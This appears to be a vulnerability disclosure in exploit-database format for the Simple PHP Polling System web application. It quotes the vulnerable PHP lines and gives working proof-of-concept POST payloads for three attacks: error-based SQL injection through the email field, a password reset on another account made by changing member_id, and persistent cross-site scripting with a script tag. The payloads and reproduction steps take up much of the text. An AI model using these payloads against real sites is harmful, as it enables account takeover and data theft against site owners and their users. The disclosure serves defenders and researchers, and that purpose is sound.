@@ -1,0 +1,53 @@
+Exploit Title	: Multiple Vulnerabilities in Simple PHP Polling System.
+Author			: WICS
+Date 			: 05-Jan-2016
+Software Link	: http://sourceforge.net/projects/pollingsystem/
+
+
+# Overview : 
+Simple PHP Polling System helps organizations to make polls of different types of positions with a number of candidates under each position.
+This vulnerable package ha 5869+ downlaods till the date.
+Multiple vulnerabilities ( SQL insertion injection, Persistent Cross Site Scripting, Password Reset. )
+
+1. SQL injection : Sql injetion  exist in following pages : 
+   --------------
+a) manage-profile.php : In manage-profile.php there is no filteration or validation for user supplied data, on parameter  " $_POST['email'] 
+line no.33 -> $myEmail = $_POST['email'];
+...
+...
+...
+line no 38 -> $sql = mysql_query( "UPDATE tbMembers SET first_name='$myFirstName', last_name='$myLastName', email='$myEmail', password='$newpass' WHERE member_id = '$myId'" )  or die( mysql_error() );
+
+an attacker can inject post parameter email to perform SQL Injecton attack.
+
+
+b) registeracc.php : In registeracc.php there is no filteration or validation for user supplied data, on parameter  " $_POST['email'] 
+line no.26 -> $myEmail = $_POST['email'];
+...
+...
+...
+line no 30 -> $sql = mysql_query( "INSERT INTO tbMembers(first_name, last_name, email, password) VALUES ('$myFirstName','$myLastName', '$myEmail', '$newpass')" )
+        or die( mysql_error() );
+
+an attacker can inject post parameter email to perform SQL Injecton attack.
+
+# PoC : firstname=WICS&lastname=tester&email=tester%40wics.com' or updatexml(2,concat(0x7e,(version())),0) or'&password=password&ConfirmPassword=password&submit=Register+Account
+
+2. Password reset : 
+   ---------------
+In manage-profile.php page, 
+line no 38 -> $sql = mysql_query( "UPDATE tbMembers SET first_name='$myFirstName', last_name='$myLastName', email='$myEmail', password='$newpass' WHERE member_id = '$myId'" )
+
+By changing the value of 'member_id' attacker can reset the user details including his password.
+steps to reproduce :
+1. Login into your account.
+2. Navagate to Manage My Profile.
+
+Request will be something like - http://localhost/vote/manage-profile.php?id= somenumber
+here the value of id will be id of victim, and value of rest of the post parameter will set by attacker.
+# PoC :  firstname=Attacker&lastname=LastNmae&email=Tester%40wics.com&password=adminadmin&ConfirmPassword=adminadmin&update=Update+Profile
+
+
+3. Persistent Cross site Scripting : In 'registeracc.php' and 'manage-profile.php' page the value of post parameter ' email ' supplied by user is not being     -----------------------------------  validated .this leaves application vulnerable to persistent Cross Site Scripting. 
+
+# PoC :   firstname=WICS&lastname=wics&email=<script>alert(document.location)</script>&password=admin&ConfirmPassword=admin&update=Update+Profile
